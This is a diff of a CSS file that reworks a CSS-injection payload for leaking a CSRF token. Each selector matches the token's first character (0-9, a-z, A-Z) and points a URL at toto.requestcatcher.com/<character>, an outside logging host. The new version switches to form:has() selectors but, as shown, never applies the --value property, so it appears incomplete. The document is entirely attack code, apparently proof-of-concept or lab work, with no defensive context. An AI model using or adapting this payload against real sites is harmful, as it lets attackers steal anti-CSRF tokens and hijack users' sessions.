@@ -1,434 +1,248 @@
 
-.csrf[value^="0"] {
-    --starts-with-0:url("https://toto.requestcatcher.com/0");
-}
-input{
-   background: var(--starts-with-0,none);
+form:has(input[value^="0"]) {
+    --value:url("https://toto.requestcatcher.com/0");
 }
 
-.csrf[value^="1"] {
-    --starts-with-1:url("https://toto.requestcatcher.com/1");
-}
-input{
-   background: var(--starts-with-1,none);
+form:has(input[value^="1"]) {
+    --value:url("https://toto.requestcatcher.com/1");
 }
 
-.csrf[value^="2"] {
-    --starts-with-2:url("https://toto.requestcatcher.com/2");
-}
-input{
-   background: var(--starts-with-2,none);
+form:has(input[value^="2"]) {
+    --value:url("https://toto.requestcatcher.com/2");
 }
 
-.csrf[value^="3"] {
-    --starts-with-3:url("https://toto.requestcatcher.com/3");
-}
-input{
-   background: var(--starts-with-3,none);
+form:has(input[value^="3"]) {
+    --value:url("https://toto.requestcatcher.com/3");
 }
 
-.csrf[value^="4"] {
-    --starts-with-4:url("https://toto.requestcatcher.com/4");
-}
-input{
-   background: var(--starts-with-4,none);
+form:has(input[value^="4"]) {
+    --value:url("https://toto.requestcatcher.com/4");
 }
 
-.csrf[value^="5"] {
-    --starts-with-5:url("https://toto.requestcatcher.com/5");
-}
-input{
-   background: var(--starts-with-5,none);
+form:has(input[value^="5"]) {
+    --value:url("https://toto.requestcatcher.com/5");
 }
 
-.csrf[value^="6"] {
-    --starts-with-6:url("https://toto.requestcatcher.com/6");
-}
-input{
-   background: var(--starts-with-6,none);
+form:has(input[value^="6"]) {
+    --value:url("https://toto.requestcatcher.com/6");
 }
 
-.csrf[value^="7"] {
-    --starts-with-7:url("https://toto.requestcatcher.com/7");
-}
-input{
-   background: var(--starts-with-7,none);
+form:has(input[value^="7"]) {
+    --value:url("https://toto.requestcatcher.com/7");
 }
 
-.csrf[value^="8"] {
-    --starts-with-8:url("https://toto.requestcatcher.com/8");
-}
-input{
-   background: var(--starts-with-8,none);
+form:has(input[value^="8"]) {
+    --value:url("https://toto.requestcatcher.com/8");
 }
 
-.csrf[value^="9"] {
-    --starts-with-9:url("https://toto.requestcatcher.com/9");
-}
-input{
-   background: var(--starts-with-9,none);
+form:has(input[value^="9"]) {
+    --value:url("https://toto.requestcatcher.com/9");
 }
 
-.csrf[value^="a"] {
-    --starts-with-a:url("https://toto.requestcatcher.com/a");
-}
-input{
-   background: var(--starts-with-a,none);
+form:has(input[value^="a"]) {
+    --value:url("https://toto.requestcatcher.com/a");
 }
 
-.csrf[value^="b"] {
-    --starts-with-b:url("https://toto.requestcatcher.com/b");
-}
-input{
-   background: var(--starts-with-b,none);
+form:has(input[value^="b"]) {
+    --value:url("https://toto.requestcatcher.com/b");
 }
 
-.csrf[value^="c"] {
-    --starts-with-c:url("https://toto.requestcatcher.com/c");
-}
-input{
-   background: var(--starts-with-c,none);
+form:has(input[value^="c"]) {
+    --value:url("https://toto.requestcatcher.com/c");
 }
 
-.csrf[value^="d"] {
-    --starts-with-d:url("https://toto.requestcatcher.com/d");
-}
-input{
-   background: var(--starts-with-d,none);
+form:has(input[value^="d"]) {
+    --value:url("https://toto.requestcatcher.com/d");
 }
 
-.csrf[value^="e"] {
-    --starts-with-e:url("https://toto.requestcatcher.com/e");
-}
-input{
-   background: var(--starts-with-e,none);
+form:has(input[value^="e"]) {
+    --value:url("https://toto.requestcatcher.com/e");
 }
 
-.csrf[value^="f"] {
-    --starts-with-f:url("https://toto.requestcatcher.com/f");
-}
-input{
-   background: var(--starts-with-f,none);
+form:has(input[value^="f"]) {
+    --value:url("https://toto.requestcatcher.com/f");
 }
 
-.csrf[value^="g"] {
-    --starts-with-g:url("https://toto.requestcatcher.com/g");
-}
-input{
-   background: var(--starts-with-g,none);
+form:has(input[value^="g"]) {
+    --value:url("https://toto.requestcatcher.com/g");
 }
 
-.csrf[value^="h"] {
-    --starts-with-h:url("https://toto.requestcatcher.com/h");
-}
-input{
-   background: var(--starts-with-h,none);
+form:has(input[value^="h"]) {
+    --value:url("https://toto.requestcatcher.com/h");
 }
 
-.csrf[value^="i"] {
-    --starts-with-i:url("https://toto.requestcatcher.com/i");
-}
-input{
-   background: var(--starts-with-i,none);
+form:has(input[value^="i"]) {
+    --value:url("https://toto.requestcatcher.com/i");
 }
 
-.csrf[value^="j"] {
-    --starts-with-j:url("https://toto.requestcatcher.com/j");
-}
-input{
-   background: var(--starts-with-j,none);
+form:has(input[value^="j"]) {
+    --value:url("https://toto.requestcatcher.com/j");
 }
 
-.csrf[value^="k"] {
-    --starts-with-k:url("https://toto.requestcatcher.com/k");
-}
-input{
-   background: var(--starts-with-k,none);
+form:has(input[value^="k"]) {
+    --value:url("https://toto.requestcatcher.com/k");
 }
 
-.csrf[value^="l"] {
-    --starts-with-l:url("https://toto.requestcatcher.com/l");
-}
-input{
-   background: var(--starts-with-l,none);
+form:has(input[value^="l"]) {
+    --value:url("https://toto.requestcatcher.com/l");
 }
 
-.csrf[value^="m"] {
-    --starts-with-m:url("https://toto.requestcatcher.com/m");
-}
-input{
-   background: var(--starts-with-m,none);
+form:has(input[value^="m"]) {
+    --value:url("https://toto.requestcatcher.com/m");
 }
 
-.csrf[value^="n"] {
-    --starts-with-n:url("https://toto.requestcatcher.com/n");
-}
-input{
-   background: var(--starts-with-n,none);
+form:has(input[value^="n"]) {
+    --value:url("https://toto.requestcatcher.com/n");
 }
 
-.csrf[value^="o"] {
-    --starts-with-o:url("https://toto.requestcatcher.com/o");
-}
-input{
-   background: var(--starts-with-o,none);
+form:has(input[value^="o"]) {
+    --value:url("https://toto.requestcatcher.com/o");
 }
 
-.csrf[value^="p"] {
-    --starts-with-p:url("https://toto.requestcatcher.com/p");
-}
-input{
-   background: var(--starts-with-p,none);
+form:has(input[value^="p"]) {
+    --value:url("https://toto.requestcatcher.com/p");
 }
 
-.csrf[value^="q"] {
-    --starts-with-q:url("https://toto.requestcatcher.com/q");
-}
-input{
-   background: var(--starts-with-q,none);
+form:has(input[value^="q"]) {
+    --value:url("https://toto.requestcatcher.com/q");
 }
 
-.csrf[value^="r"] {
-    --starts-with-r:url("https://toto.requestcatcher.com/r");
-}
-input{
-   background: var(--starts-with-r,none);
+form:has(input[value^="r"]) {
+    --value:url("https://toto.requestcatcher.com/r");
 }
 
-.csrf[value^="s"] {
-    --starts-with-s:url("https://toto.requestcatcher.com/s");
-}
-input{
-   background: var(--starts-with-s,none);
+form:has(input[value^="s"]) {
+    --value:url("https://toto.requestcatcher.com/s");
 }
 
-.csrf[value^="t"] {
-    --starts-with-t:url("https://toto.requestcatcher.com/t");
-}
-input{
-   background: var(--starts-with-t,none);
+form:has(input[value^="t"]) {
+    --value:url("https://toto.requestcatcher.com/t");
 }
 
-.csrf[value^="u"] {
-    --starts-with-u:url("https://toto.requestcatcher.com/u");
-}
-input{
-   background: var(--starts-with-u,none);
+form:has(input[value^="u"]) {
+    --value:url("https://toto.requestcatcher.com/u");
 }
 
-.csrf[value^="v"] {
-    --starts-with-v:url("https://toto.requestcatcher.com/v");
-}
-input{
-   background: var(--starts-with-v,none);
+form:has(input[value^="v"]) {
+    --value:url("https://toto.requestcatcher.com/v");
 }
 
-.csrf[value^="w"] {
-    --starts-with-w:url("https://toto.requestcatcher.com/w");
-}
-input{
-   background: var(--starts-with-w,none);
+form:has(input[value^="w"]) {
+    --value:url("https://toto.requestcatcher.com/w");
 }
 
-.csrf[value^="x"] {
-    --starts-with-x:url("https://toto.requestcatcher.com/x");
-}
-input{
-   background: var(--starts-with-x,none);
+form:has(input[value^="x"]) {
+    --value:url("https://toto.requestcatcher.com/x");
 }
 
-.csrf[value^="y"] {
-    --starts-with-y:url("https://toto.requestcatcher.com/y");
-}
-input{
-   background: var(--starts-with-y,none);
+form:has(input[value^="y"]) {
+    --value:url("https://toto.requestcatcher.com/y");
 }
 
-.csrf[value^="z"] {
-    --starts-with-z:url("https://toto.requestcatcher.com/z");
-}
-input{
-   background: var(--starts-with-z,none);
+form:has(input[value^="z"]) {
+    --value:url("https://toto.requestcatcher.com/z");
 }
 
-.csrf[value^="A"] {
-    --starts-with-A:url("https://toto.requestcatcher.com/A");
-}
-input{
-   background: var(--starts-with-A,none);
+form:has(input[value^="A"]) {
+    --value:url("https://toto.requestcatcher.com/A");
 }
 
-.csrf[value^="B"] {
-    --starts-with-B:url("https://toto.requestcatcher.com/B");
-}
-input{
-   background: var(--starts-with-B,none);
+form:has(input[value^="B"]) {
+    --value:url("https://toto.requestcatcher.com/B");
 }
 
-.csrf[value^="C"] {
-    --starts-with-C:url("https://toto.requestcatcher.com/C");
-}
-input{
-   background: var(--starts-with-C,none);
+form:has(input[value^="C"]) {
+    --value:url("https://toto.requestcatcher.com/C");
 }
 
-.csrf[value^="D"] {
-    --starts-with-D:url("https://toto.requestcatcher.com/D");
-}
-input{
-   background: var(--starts-with-D,none);
+form:has(input[value^="D"]) {
+    --value:url("https://toto.requestcatcher.com/D");
 }
 
-.csrf[value^="E"] {
-    --starts-with-E:url("https://toto.requestcatcher.com/E");
-}
-input{
-   background: var(--starts-with-E,none);
+form:has(input[value^="E"]) {
+    --value:url("https://toto.requestcatcher.com/E");
 }
 
-.csrf[value^="F"] {
-    --starts-with-F:url("https://toto.requestcatcher.com/F");
-}
-input{
-   background: var(--starts-with-F,none);
+form:has(input[value^="F"]) {
+    --value:url("https://toto.requestcatcher.com/F");
 }
 
-.csrf[value^="G"] {
-    --starts-with-G:url("https://toto.requestcatcher.com/G");
-}
-input{
-   background: var(--starts-with-G,none);
+form:has(input[value^="G"]) {
+    --value:url("https://toto.requestcatcher.com/G");
 }
 
-.csrf[value^="H"] {
-    --starts-with-H:url("https://toto.requestcatcher.com/H");
-}
-input{
-   background: var(--starts-with-H,none);
+form:has(input[value^="H"]) {
+    --value:url("https://toto.requestcatcher.com/H");
 }
 
-.csrf[value^="I"] {
-    --starts-with-I:url("https://toto.requestcatcher.com/I");
-}
-input{
-   background: var(--starts-with-I,none);
+form:has(input[value^="I"]) {
+    --value:url("https://toto.requestcatcher.com/I");
 }
 
-.csrf[value^="J"] {
-    --starts-with-J:url("https://toto.requestcatcher.com/J");
-}
-input{
-   background: var(--starts-with-J,none);
+form:has(input[value^="J"]) {
+    --value:url("https://toto.requestcatcher.com/J");
 }
 
-.csrf[value^="K"] {
-    --starts-with-K:url("https://toto.requestcatcher.com/K");
-}
-input{
-   background: var(--starts-with-K,none);
+form:has(input[value^="K"]) {
+    --value:url("https://toto.requestcatcher.com/K");
 }
 
-.csrf[value^="L"] {
-    --starts-with-L:url("https://toto.requestcatcher.com/L");
-}
-input{
-   background: var(--starts-with-L,none);
+form:has(input[value^="L"]) {
+    --value:url("https://toto.requestcatcher.com/L");
 }
 
-.csrf[value^="M"] {
-    --starts-with-M:url("https://toto.requestcatcher.com/M");
-}
-input{
-   background: var(--starts-with-M,none);
+form:has(input[value^="M"]) {
+    --value:url("https://toto.requestcatcher.com/M");
 }
 
-.csrf[value^="N"] {
-    --starts-with-N:url("https://toto.requestcatcher.com/N");
-}
-input{
-   background: var(--starts-with-N,none);
+form:has(input[value^="N"]) {
+    --value:url("https://toto.requestcatcher.com/N");
 }
 
-.csrf[value^="O"] {
-    --starts-with-O:url("https://toto.requestcatcher.com/O");
-}
-input{
-   background: var(--starts-with-O,none);
+form:has(input[value^="O"]) {
+    --value:url("https://toto.requestcatcher.com/O");
 }
 
-.csrf[value^="P"] {
-    --starts-with-P:url("https://toto.requestcatcher.com/P");
-}
-input{
-   background: var(--starts-with-P,none);
+form:has(input[value^="P"]) {
+    --value:url("https://toto.requestcatcher.com/P");
 }
 
-.csrf[value^="Q"] {
-    --starts-with-Q:url("https://toto.requestcatcher.com/Q");
-}
-input{
-   background: var(--starts-with-Q,none);
+form:has(input[value^="Q"]) {
+    --value:url("https://toto.requestcatcher.com/Q");
 }
 
-.csrf[value^="R"] {
-    --starts-with-R:url("https://toto.requestcatcher.com/R");
-}
-input{
-   background: var(--starts-with-R,none);
+form:has(input[value^="R"]) {
+    --value:url("https://toto.requestcatcher.com/R");
 }
 
-.csrf[value^="S"] {
-    --starts-with-S:url("https://toto.requestcatcher.com/S");
-}
-input{
-   background: var(--starts-with-S,none);
+form:has(input[value^="S"]) {
+    --value:url("https://toto.requestcatcher.com/S");
 }
 
-.csrf[value^="T"] {
-    --starts-with-T:url("https://toto.requestcatcher.com/T");
-}
-input{
-   background: var(--starts-with-T,none);
+form:has(input[value^="T"]) {
+    --value:url("https://toto.requestcatcher.com/T");
 }
 
-.csrf[value^="U"] {
-    --starts-with-U:url("https://toto.requestcatcher.com/U");
-}
-input{
-   background: var(--starts-with-U,none);
+form:has(input[value^="U"]) {
+    --value:url("https://toto.requestcatcher.com/U");
 }
 
-.csrf[value^="V"] {
-    --starts-with-V:url("https://toto.requestcatcher.com/V");
-}
-input{
-   background: var(--starts-with-V,none);
+form:has(input[value^="V"]) {
+    --value:url("https://toto.requestcatcher.com/V");
 }
 
-.csrf[value^="W"] {
-    --starts-with-W:url("https://toto.requestcatcher.com/W");
-}
-input{
-   background: var(--starts-with-W,none);
+form:has(input[value^="W"]) {
+    --value:url("https://toto.requestcatcher.com/W");
 }
 
-.csrf[value^="X"] {
-    --starts-with-X:url("https://toto.requestcatcher.com/X");
-}
-input{
-   background: var(--starts-with-X,none);
+form:has(input[value^="X"]) {
+    --value:url("https://toto.requestcatcher.com/X");
 }
 
-.csrf[value^="Y"] {
-    --starts-with-Y:url("https://toto.requestcatcher.com/Y");
-}
-input{
-   background: var(--starts-with-Y,none);
+form:has(input[value^="Y"]) {
+    --value:url("https://toto.requestcatcher.com/Y");
 }
 
-.csrf[value^="Z"] {
-    --starts-with-Z:url("https://toto.requestcatcher.com/Z");
-}
-input{
-   background: var(--starts-with-Z,none);
+form:has(input[value^="Z"]) {
+    --value:url("https://toto.requestcatcher.com/Z");
 }
